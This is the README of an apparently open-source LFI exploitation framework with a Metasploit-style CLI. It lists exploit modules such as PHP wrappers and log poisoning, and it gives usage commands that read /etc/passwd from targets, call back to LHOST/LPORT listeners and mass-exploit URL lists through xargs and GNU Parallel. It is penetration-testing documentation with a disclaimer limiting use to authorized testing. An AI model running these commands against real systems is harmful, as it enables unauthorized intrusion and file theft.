# Liffy Ultimate Framework

<div align="center">

![Liffy Ultimate](https://img.shields.io/badge/Liffy-Ultimate-red?style=for-the-badge&logo=python)
![Version](https://img.shields.io/badge/Version-3.0.0-blue?style=for-the-badge)
![Codename](https://img.shields.io/badge/Codename-ShadowStrike-purple?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.7+-green?style=for-the-badge&logo=python)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)

**Advanced LFI Exploitation Framework with Metasploit-style CLI**

[![GitHub stars](https://img.shields.io/github/stars/rotlogix/liffy-ultimate?style=social)](https://github.com/rotlogix/liffy-ultimate)
[![GitHub forks](https://img.shields.io/github/forks/rotlogix/liffy-ultimate?style=social)](https://github.com/rotlogix/liffy-ultimate)
[![GitHub issues](https://img.shields.io/github/issues/rotlogix/liffy-ultimate?style=social)](https://github.com/rotlogix/liffy-ultimate)

</div>

---

## 🚀 **Overview**

Liffy Ultimate is a comprehensive Local File Inclusion (LFI) exploitation framework that provides a Metasploit-style command-line interface for penetration testers and security researchers. It combines multiple LFI exploitation techniques, automated target discovery, and advanced payload generation into a single, powerful tool.

### **Key Features**

- 🎯 **Metasploit-style CLI** - Familiar interface for security professionals
- 🔧 **Multiple LFI Techniques** - Data, Input, Filter, Expect, Environ, and more
- 🚀 **Fast Testing** - Batch processing with xargs and parallel support
- 🎨 **Beautiful UI** - Color-coded output and progress indicators
- 🔍 **Target Discovery** - Automated target enumeration and URL gathering
- 🏹 **Hunting Mode** - Automated LFI vulnerability hunting
- 🌐 **API Mode** - REST API for integration with other tools
- 📊 **Comprehensive Reporting** - JSON output and detailed logging

---

## 🛠️ **Installation**

### **Quick Install**

```bash
# Clone the repository
git clone https://github.com/rotlogix/liffy-ultimate.git
cd liffy-ultimate

# Run the setup script
chmod +x setup_ultimate.sh
./setup_ultimate.sh
```

### **Manual Install**

```bash
# Install Python dependencies
pip3 install -r requirements.txt

# Make scripts executable
chmod +x liffy_ultimate.py liffy-fast liffy_techniques.py

# Create configuration directory
mkdir -p ~/.liffy/{logs,sessions,payloads,templates,wordlists,results}
```

---

## 🎮 **Usage**

### **Interactive Mode**

```bash
# Start the interactive framework
liffy

# Or use the full command
python3 liffy_ultimate.py
```

### **Command Line Mode**

```bash
# Quick LFI testing
liffy-fast filter --url "http://target/file.php?page=" --file "/etc/passwd"

# Batch processing
cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444

# Technique-specific commands
liffy-techniques data --url "http://target/file.php?page=" --lhost 192.168.1.100 --lport 4444
```

---

## 📋 **Module Categories**

### **Exploit Modules**

| Module | Description | Rank | Targets |
|--------|-------------|------|---------|
| `exploit/lfi/data` | LFI via data:// wrapper | Excellent | PHP |
| `exploit/lfi/input` | LFI via php://input wrapper | Excellent | PHP |
| `exploit/lfi/expect` | LFI via expect:// wrapper | Good | PHP with expect |
| `exploit/lfi/environ` | LFI via /proc/self/environ | Good | Linux |
| `exploit/lfi/access_logs` | Apache access log poisoning | Good | Apache |
| `exploit/lfi/ssh_logs` | SSH auth log poisoning | Good | Linux with SSH |
| `exploit/lfi/filter` | LFI via php://filter wrapper | Excellent | PHP |
| `exploit/lfi/zip` | LFI via zip:// wrapper | Good | PHP |
| `exploit/lfi/phar` | LFI via phar:// wrapper | Good | PHP |
| `exploit/lfi/compress` | LFI via compress.zlib:// wrapper | Good | PHP |
| `exploit/lfi/auto` | Automatic LFI detection | Excellent | Multiple |

### **Auxiliary Modules**

| Module | Description | Type |
|--------|-------------|------|
| `auxiliary/lfi/scanner` | LFI vulnerability scanner | Scanner |
| `auxiliary/lfi/batch_exploit` | Batch LFI exploitation | Exploit |
| `auxiliary/discovery/target_finder` | Target discovery and enumeration | Discovery |
| `auxiliary/discovery/url_gatherer` | URL gathering and parameter extraction | Discovery |
| `auxiliary/hunting/lfi_hunter` | Automated LFI hunting | Hunting |
| `auxiliary/api/rest_api` | REST API server | API |

---

## 🎯 **Interactive Commands**

### **Core Commands**

```bash
help                    # Show help message
exit / quit            # Exit the framework
version                # Show version information
banner                 # Display banner
clear / cls            # Clear screen
```

### **Module Commands**

```bash
use <module>           # Use a module
search <keyword>       # Search for modules
show <type>            # Show modules by type
info                   # Show current module info
back                   # Exit current module
```

### **Module Options**

```bash
set <option> <value>   # Set module option
unset <option>         # Unset module option
show options           # Show module options
run / exploit          # Run the module
```

### **Utility Commands**

```bash
history                # Show command history
sessions               # Show active sessions
jobs                   # Show background jobs
kill <job_id>          # Kill background job
```

---

## 🔧 **Configuration**

### **Main Configuration**

The framework uses `~/.liffy/config.json` for configuration:

```json
{
    "version": "3.0.0",
    "codename": "ShadowStrike",
    "defaults": {
        "threads": 4,
        "timeout": 30,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "output_dir": "~/.liffy/results",
        "log_level": "INFO"
    },
    "modules": {
        "exploit": {
            "default_rank": "normal",
            "auto_exploit": false
        },
        "auxiliary": {
            "default_threads": 10,
            "default_timeout": 30
        }
    },
    "api": {
        "host": "127.0.0.1",
        "port": 8080,
        "debug": false
    }
}
```

### **Directory Structure**

```
~/.liffy/
├── config.json          # Main configuration
├── logs/                # Log files
├── sessions/            # Session data
├── payloads/            # Payload templates
├── templates/           # Exploit templates
├── wordlists/           # Wordlists
└── results/             # Results and reports
```

---

## 🚀 **Advanced Usage**

### **Batch Processing**

```bash
# Process multiple URLs
cat urls.txt | liffy-fast filter --batch --file "/etc/passwd"

# Parallel processing
cat urls.txt | liffy-fast data --batch --parallel --lhost 192.168.1.100 --lport 4444

# JSON output
cat urls.txt | liffy-fast filter --batch --json --file "/etc/passwd" > results.json
```

### **Xargs Integration**

```bash
# Basic xargs usage
cat urls.txt | xargs -I {} liffy-fast filter --url "{}" --file "/etc/passwd"

# Parallel xargs
cat urls.txt | xargs -P 4 -I {} liffy-fast data --url "{}" --lhost 192.168.1.100 --lport 4444
```

### **GNU Parallel Integration**

```bash
# Basic parallel usage
cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'

# Advanced parallel with progress
cat urls.txt | parallel --progress -j 4 'liffy-fast filter --url {} --file /etc/passwd'
```

### **API Mode**

```bash
# Start API server
liffy --module auxiliary/api/rest_api

# Use API endpoints
curl -X POST http://127.0.0.1:8080/api/exploit \
  -H "Content-Type: application/json" \
  -d '{"module": "exploit/lfi/data", "options": {"URL": "http://target/file.php?page=", "LHOST": "192.168.1.100", "LPORT": 4444}}'
```

---

## 🔍 **Examples**

### **Basic LFI Exploitation**

```bash
# Start interactive mode
liffy

# Use data wrapper module
use exploit/lfi/data

# Set options
set URL http://target/file.php?page=
set LHOST 192.168.1.100
set LPORT 4444

# Run exploit
run
```

### **Filter-based File Reading**

```bash
# Use filter module
use exploit/lfi/filter

# Set options
set URL http://target/file.php?page=
set FILE /etc/passwd

# Run exploit
run
```

### **Batch Vulnerability Scanning**

```bash
# Use scanner module
use auxiliary/lfi/scanner

# Set options
set URLS urls.txt
set THREADS 10

# Run scan
run
```

### **Target Discovery**

```bash
# Use target finder
use auxiliary/discovery/target_finder

# Set options
set DOMAIN example.com
set SUBDOMAINS true

# Run discovery
run
```

---

## 🛡️ **Security Features**

### **Safe Mode**

The framework includes several safety features:

- **Input Validation** - All inputs are validated before processing
- **Rate Limiting** - Built-in rate limiting to avoid overwhelming targets
- **Error Handling** - Comprehensive error handling and logging
- **Session Management** - Secure session handling and cleanup

### **Logging**

All activities are logged with different levels:

- **DEBUG** - Detailed debugging information
- **INFO** - General information
- **WARNING** - Warning messages
- **ERROR** - Error messages
- **CRITICAL** - Critical errors

---

## 🤝 **Contributing**

We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details.

### **Development Setup**

```bash
# Clone the repository
git clone https://github.com/rotlogix/liffy-ultimate.git
cd liffy-ultimate

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install development dependencies
pip install -r requirements-dev.txt

# Run tests
python -m pytest tests/
```

---

## 📄 **License**

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🙏 **Acknowledgments**

- **rotlogix** - Original Liffy creator
- **unicornFurnace** - Framework enhancement
- **OWASP** - Security guidelines and references
- **Metasploit** - CLI design inspiration
- **Security Community** - Feedback and contributions

---

## 📞 **Support**

- **Issues**: [GitHub Issues](https://github.com/rotlogix/liffy-ultimate/issues)
- **Discussions**: [GitHub Discussions](https://github.com/rotlogix/liffy-ultimate/discussions)
- **Wiki**: [GitHub Wiki](https://github.com/rotlogix/liffy-ultimate/wiki)

---

## ⚠️ **Disclaimer**

This tool is for educational and authorized testing purposes only. The authors are not responsible for any misuse or damage caused by this tool. Always ensure you have proper authorization before testing any systems.

---

<div align="center">

**Made with ❤️ by the Liffy Ultimate Team**

[![GitHub](https://img.shields.io/badge/GitHub-rotlogix/liffy--ultimate-black?style=for-the-badge&logo=github)](https://github.com/rotlogix/liffy-ultimate)
[![Twitter](https://img.shields.io/badge/Twitter-@rotlogix-blue?style=for-the-badge&logo=twitter)](https://twitter.com/rotlogix)

</div>